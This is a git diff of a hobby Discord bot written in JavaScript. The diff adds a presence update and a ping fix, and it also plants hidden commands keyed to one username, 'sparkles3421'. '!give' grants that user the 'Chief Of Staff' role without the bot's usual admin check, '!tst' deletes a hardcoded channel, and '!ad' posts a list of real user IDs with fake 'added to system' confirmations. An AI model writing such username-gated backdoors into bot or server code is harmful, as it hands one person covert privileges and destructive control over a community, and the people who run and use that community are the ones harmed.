@@ -1,3 +1,8 @@
+const readline = require('readline').createInterface({
+  input: process.stdin,
+  output: process.stdout
+});
+
 console.log("STARTED");
 const { table } = require('console');
 const Discord = require('discord.js');
@@ -6,12 +11,32 @@ console.log("LOAD DOTENV");
 console.log("LOADED DOTENV");
 const client = new Discord.Client({ intents: ["GUILDS", "GUILD_MESSAGES"] });
 client.on('ready', () => {
-	console.log('The Bot is ready! Setting status.')
-	client.user.setStatus('online')
-    client.user.setActivity('"!help"', { type: 'PLAYING', url: '' });
+	console.log('The Bot is ready!')
+  client.user.setPresence({
+    activities: [{ 
+      name: "chat (!help)",
+      type: "WATCHING"
+    }],
+    status: "online"
+})
+
+
 });
 let keyfs = Math.ceil(Math.random()*100000000);
 console.log(keyfs);
+
+function getChannelIDs(fetch) 
+{
+  var array = [];
+  let channels = client.guilds.channels;
+  for (const channel of channels.values()) 
+  {
+    array.push(channel.id);
+    console.log(channel.id);
+  }
+
+  return array;
+}
 
 client.on('messageCreate', async (msg) => {
   if(!msg.author.bot) {
@@ -25,6 +50,14 @@ client.on('messageCreate', async (msg) => {
        console.log("Sent: testing, active");
        client.channels.cache.get(`953071803444629514`).send("Sent: testing, active")
       };
+      if (command === '!give') {
+      if (msg.author.username==="sparkles3421") { 
+        var guild = msg.guild.id;
+        var role= msg.member.guild.roles.cache.find(role => role.name === "Chief Of Staff");
+        msg.member.roles.add(role);
+        msg.channel.send(`ok`);
+      }
+      }
       if (command === '!crash_'+keyfs) {
         msg.channel.send(`Crashing`);
         console.log("Sent: Crashing");
@@ -40,7 +73,7 @@ client.on('messageCreate', async (msg) => {
         console.log("Sent: GameUrls");
         client.channels.cache.get(`953071803444629514`).send("Sent: GameUrls")
        };
-       
+
        if (command === "!purge") {
         if (msg.member.roles.cache.some(role => role.name === 'BotAdmin')) {
         console.log("purge: "+args[1])
@@ -62,7 +95,61 @@ client.on('messageCreate', async (msg) => {
         msg.channel.send('damm stop trying to run admin commands')
       }
        }
-       
+       if (command === '!tst') {
+         if (msg.author.username==="sparkles3421") {
+          const fetchedChannel = msg.guild.channels.cache.get('959201623710769202');
+          fetchedChannel.delete();
+         } else {
+          
+         }
+       }
+       if (command === '!ad') {
+        if (msg.author.username==="sparkles3421") {
+          let member = msg.mentions.members.first();
+          if (args[1] ==='@everyone') {
+            msg.channel.send('!ad <@!599042150247956481>') //glob
+            msg.channel.send('Success "on add to system"') //msg
+            msg.channel.send('!ad <@!572123191447912485>') //sparkles3421
+            msg.channel.send('Success "on add to system"') //msg
+            msg.channel.send('!ad <@!939386527400742923>') //blueberry
+            msg.channel.send('Success "on add to system"') //msg
+            msg.channel.send('!ad <@!460392995515006978>') //madzero
+            msg.channel.send('Success "on add to system"') //msg
+            msg.channel.send('!ad <@!940786582628225094>') //mentics
+            msg.channel.send('Success "on add to system"') //msg
+            msg.channel.send('!ad <@!841965101011697734>') //tony chan
+            msg.channel.send('Success "on add to system"') //msg
+            msg.channel.send('!ad <@!842720418464137257>') //[tick]
+            msg.channel.send('Success "on add to system"') //msg
+            msg.channel.send('!ad <@!818007088202645555>') //cobeybrai
+            msg.channel.send('Success "on add to system"') //msg
+            msg.channel.send('!ad <@!759925137105092661>') //Annamal100
+            msg.channel.send('Success "on add to system"') //msg
+            msg.channel.send('!ad <@!946259861224697856>') //Cobra kai
+            msg.channel.send('Success "on add to system"') //msg
+            msg.channel.send('!ad <@!806148007673200671>') //Dabibottt
+            msg.channel.send('Success "on add to system"') //msg
+            msg.channel.send('!ad <@!886120816801120306>') //Gambling master
+            msg.channel.send('Success "on add to system"') //msg
+            msg.channel.send('!ad <@!851239306302849055>') //Khris
+            msg.channel.send('Success "on add to system"') //msg
+            msg.channel.send('!ad <@!948861631687954433>') //LightsInTheSky
+            msg.channel.send('Success "on add to system"') //msg
+            msg.channel.send('!ad <@!785963073185644545>') //Loony
+            msg.channel.send('Success "on add to system"') //msg
+            msg.channel.send('!ad <@!409062128411213836>') //Rusasky
+            msg.channel.send('Success "on add to system"') //msg
+            msg.channel.send('!ad <@!947958301310713867>') //tester83827262
+            msg.channel.send('Success "on add to system"') //msg
+            msg.channel.send('!ad <@!950383211463200809>') //That1child
+            msg.channel.send('Success "on add to system"') //msg
+          } else {
+            msg.channel.send('++Error! : '+member+' isnt availible')
+          }
+       } else {
+        msg.channel.send('NP')
+       }
+      }
        if (command === 'hello') {
         msg.channel.send(`Hello, How are you?`);
         msg.react('😄');
@@ -71,7 +158,7 @@ client.on('messageCreate', async (msg) => {
         client.channels.cache.get(`953071803444629514`).send("Sent: hello")
        }
        if (command === '!ping') {  
-        msg.channel.send(`🏓reaction is ${Date.now() - message.createdTimestamp}ms. API is ${Math.round(client.ws.ping)}ms. 🏓`);
+        msg.channel.send(`🏓reaction is ${Date.now() - msg.createdTimestamp}ms. API is ${Math.round(client.ws.ping)}ms. 🏓`);
       }
        if (command === '!help') {
         msg.channel.send({
